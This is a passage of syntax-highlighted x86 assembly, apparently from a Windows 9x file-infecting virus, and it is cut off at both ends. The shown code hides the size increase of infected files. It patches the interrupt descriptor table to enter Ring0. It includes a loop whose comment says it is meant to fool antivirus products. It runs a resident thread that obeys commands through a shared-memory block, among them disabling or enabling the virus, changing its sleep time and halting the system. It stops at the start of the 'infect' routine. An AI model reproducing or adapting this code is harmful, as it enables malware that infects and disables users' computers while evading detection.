    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">s_close</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.MZ_res2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">29ah</span><span class="sc0">  </span><span class="sc1">;is it infected</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">s_close</span><span class="sc0">                             </span><span class="sc1">;no, quit</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">2000h</span><span class="sc0">   </span><span class="sc1">;yeah, return original</span><span class="sc0">
                                                       </span><span class="sc1">;size</span><span class="sc0">

</span><span class="sc5">s_close</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">                             </span><span class="sc1">;close file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">s_int21h</span><span class="sc0">
</span><span class="sc5">quit_stealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">semaphore</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;set semaphore</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore all regs</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                     </span><span class="sc1">;clear carry</span><span class="sc0">
</span><span class="sc5">b2caller</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                          </span><span class="sc1">;and jump back</span><span class="sc0">
</span><span class="sc5">s_ret</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">;to host program</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;...</span><span class="sc0">

</span><span class="sc5">EnterRing0</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;Ring0 port</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;get address</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;save all registers</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;and again</span><span class="sc0">
        </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;load 6byte long IDT address</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore registers</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">                         </span><span class="sc1">;move to int3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;save original IDT</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;modify IDT</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;move by 2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;save original IDT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;save pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eeh</span><span class="sc0">                            </span><span class="sc1">;IDT FLAGs</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                             </span><span class="sc1">;fill registers with</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                             </span><span class="sc1">;selectors for l8r use</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                             </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">                             </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                 </span><span class="sc1">;save some selectors</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                   </span><span class="sc1">;JuMpToRiNg0!</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                  </span><span class="sc1">;restore selectors</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                  </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;restore ptr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">;move with ptr</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;and restore IDT</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">p_jmp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;some silly loop to fool</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;some AVs. Will be overwritten</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">p_jmp</span><span class="sc0">                               </span><span class="sc1">;with NOPs l8r by new thread</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore all regs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LeaveRing0</span><span class="sc0">                          </span><span class="sc1">;and leave procedure</span><span class="sc0">

</span><span class="sc5">Thread</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">                                     </span><span class="sc1">;thread procedure start here</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc0">                            </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">tgdelta</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">p_jmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">90909090h</span><span class="sc0">  </span><span class="sc1">;overwrite silly loop by NOPs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0">            </span><span class="sc1">;reserve one page</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">;in shared memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PR_SHARED</span><span class="sc0">                          </span><span class="sc1">;for BGCB</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010000h</span><span class="sc0">                          </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">t_sleep</span><span class="sc0">                              </span><span class="sc1">;error?</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">                      </span><span class="sc1">;is it in shared memory ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">free_pg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;save address</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_PRESENT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_FIXED</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;and now we will commit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PD_ZEROINIT</span><span class="sc0">                        </span><span class="sc1">;physical space in memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0">                            </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010001h</span><span class="sc0">                          </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;if error, free pages</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">free_pg</span><span class="sc0">                              </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc1">;some equates for BGCB</span><span class="sc0">

</span><span class="sc5">BGCB_Signature</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00</span><span class="sc0">                      </span><span class="sc1">;BGCB signature ('BGCB')</span><span class="sc0">
</span><span class="sc5">BGCB_New</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04</span><span class="sc0">                      </span><span class="sc1">;new request (1-new, 0 not)</span><span class="sc0">
</span><span class="sc5">BGCB_ID</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08</span><span class="sc0">                      </span><span class="sc1">;ID of request</span><span class="sc0">
</span><span class="sc5">BGCB_Data</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">                      </span><span class="sc1">;property data</span><span class="sc0">

                                                </span><span class="sc1">;EAX=1, ECX=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'BCGB'</span><span class="sc0">        </span><span class="sc1">;set signature</span><span class="sc0">
</span><span class="sc5">t_rep</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">t_sleep</span><span class="sc0">                            </span><span class="sc1">;sleep for some ms</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">;exclusive execution</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;anything new?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">t_end</span><span class="sc0">                                </span><span class="sc1">;no</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;yeah, nulify item</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;and check ID</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                           </span><span class="sc1">;0?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">p_test</span><span class="sc0">                               </span><span class="sc1">;virus presency check</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;1?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_test</span><span class="sc0">                               </span><span class="sc1">;virus state checkin'</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;2?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d_test</span><span class="sc0">                               </span><span class="sc1">;disable virus actions</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;3?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">e_test</span><span class="sc0">                               </span><span class="sc1">;enable virus actions</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;4?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g_test</span><span class="sc0">                               </span><span class="sc1">;get sleep time</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;5?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">si_test</span><span class="sc0">                              </span><span class="sc1">;increase sleep time</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;6?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">sd_test</span><span class="sc0">                              </span><span class="sc1">;decrease sleep time</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;7?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_test</span><span class="sc0">                               </span><span class="sc1">;system halt</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;8?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ds_test</span><span class="sc0">                              </span><span class="sc1">;disconnect</span><span class="sc0">
</span><span class="sc5">t_end</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sti</span><span class="sc0">                                     </span><span class="sc1">;allow INTs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_rep</span><span class="sc0">                               </span><span class="sc1">;and sleep</span><span class="sc0">

</span><span class="sc5">p_test</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;set BGCB data to 1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_end</span><span class="sc0">

</span><span class="sc5">i_test</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;set BGCB data to v_state</span><span class="sc0">
</span><span class="sc5">v_state</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_end</span><span class="sc0">

</span><span class="sc5">d_test</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall_hook</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc4">+((</span><span class="sc5">farjmp</span><span class="sc4">-</span><span class="sc5">VxDCall_hook</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_end</span><span class="sc0">                               </span><span class="sc1">;construct JMP to end</span><span class="sc0">

</span><span class="sc5">e_test</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall_hook</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e860h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_end</span><span class="sc0">                               </span><span class="sc1">;reconstruct original bytes</span><span class="sc0">

</span><span class="sc5">g_test</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sleep_t</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get sleep time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;store it in BGCB data</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_end</span><span class="sc0">

</span><span class="sc5">si_test</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get increment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sleep_t</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">;add it to sleep time</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_end</span><span class="sc0">

</span><span class="sc5">sd_test</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get decrement</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sleep_t</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">;substract sleep time with it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_end</span><span class="sc0">

</span><span class="sc5">k_test</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">;halt system</span><span class="sc0">
</span><span class="sc5">_hlt_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_hlt_</span><span class="sc0">

</span><span class="sc5">ds_test</span><span class="sc4">:</span><span class="sc6">sti</span><span class="sc0">                                     </span><span class="sc1">;allow INTs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;decommit page</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010002h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">free_pg</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;free page</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0001000ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                                 </span><span class="sc1">;sleep thread for ever</span><span class="sc0">
</span><span class="sc5">sleep</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">002a0009h</span><span class="sc0">                          </span><span class="sc1">;service Sleep</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;call it</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore all regs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;return</span><span class="sc0">
</span><span class="sc5">t_sleep</span><span class="sc4">:</span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;save all regs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                               </span><span class="sc1">;one second long sleep time</span><span class="sc0">
</span><span class="sc5">sleep_t</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sleep</span><span class="sc0">                               </span><span class="sc1">;sleep</span><span class="sc0">
</span><span class="sc5">Thread</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">                                     </span><span class="sc1">;thread ends here</span><span class="sc0">


</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;ESI=EDI</span><span class="sc0">
